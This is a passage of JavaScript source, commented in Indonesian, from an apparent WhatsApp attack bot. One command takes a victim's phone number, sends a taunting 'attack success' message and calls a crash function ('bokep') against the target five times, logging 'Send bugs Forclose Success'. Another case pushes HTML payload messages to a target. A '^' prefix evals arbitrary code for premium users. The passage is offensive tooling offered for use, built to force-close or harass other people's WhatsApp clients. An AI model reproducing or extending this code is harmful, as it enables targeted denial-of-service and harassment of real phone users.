            payload: html
          }
        }
      });

      // 1. Loading -> Game
      const load1 = await SOCKET.sendRich(target, { text: '⏳ Memuat Game...' });
      await new Promise(r => setTimeout(r, 1000));
      await SOCKET.editRich(target, load1.key, { sections: [htmlSection(HTML_GAME)] });
      await new Promise(r => setTimeout(r, 1500));

      // 2. Loading -> Alert
      const load2 = await SOCKET.sendRich(target, { text: '⏳ Memuat Alert...' });
      await new Promise(r => setTimeout(r, 1000));
      await SOCKET.editRich(target, load2.key, { sections: [htmlSection(HTML_ALERT)] });

    } else {
      throw new Error("Fungsi sendHtml / editRich tidak tersedia.");
    }

  } catch (error) {
    console.error("[XLP ERROR]", error);
    m.reply("❌ Gagal mengirim payload: " + error.message);
  }
  break;
}

case 'zxfc': {
    if (!isBot && !isPremium) return reply("Only Premiumz Access ❌");
    if (!text) return reply(`Usage : zxfc 628xx`);      
        let memekz = text.replace(/[^0-9]/g, "");
    if (memekz.startsWith('0'))
     return reply(`Ex : xzfc 628xx`);
        
    let X = memekz + '@s.whatsapp.net'
    const x = `⌜ \`🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢ 𝐒𝐔͢͠𝐂𝐂͢ᯭ𝐄𝐒\` ⌟

𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X}
𖥂 𝐕𝐈𝐑𝐔𝐒 : \`⌁⃰༑ ⌁⃰𝐓͢𝐫ͯ𝐚͢𝐬ͯ𝐡𝐒͢𝐨ͯ𝐱 ⌁⃰༑\`

┏─────⧼ 「 〄 」
└─ ◇ \`DONE ATTACK\` •
*-The Target Has Been Fallen ↯*`;
    await WaSocket.sendMessage(from, {
        image: { url: `https://files.catbox.moe/mv7u2r.jpg` },                  
        caption: `${x}`                      
    }, { quoted: m });
    // <<( The Calling Function )>>
    for (let i = 0; i < 5; i++) {       
       await bokep(target);
       await sleep(1000);
    }
    
     console.log(chalk.red.bold("Send bugs Forclose Success\n© By ZTrashFixRevolution 🐉"));      
    } break;  
///====[ CASE AMBIL FUNCTION AJA ]====///



   //END 
      
    default:
    if (budy.startsWith('^')) {
      if (!isPremium && !isChannel) return;
      try {
        let evaled = await eval(budy.slice(1));
        if (typeof evaled!== 'string') evaled = require('util').inspect(evaled);
        reply(evaled);
      } catch (err) {
        reply(String(err));
      }
    } break;
  }
};

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file);
  console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
  delete require.cache[file];
  require(file);
});

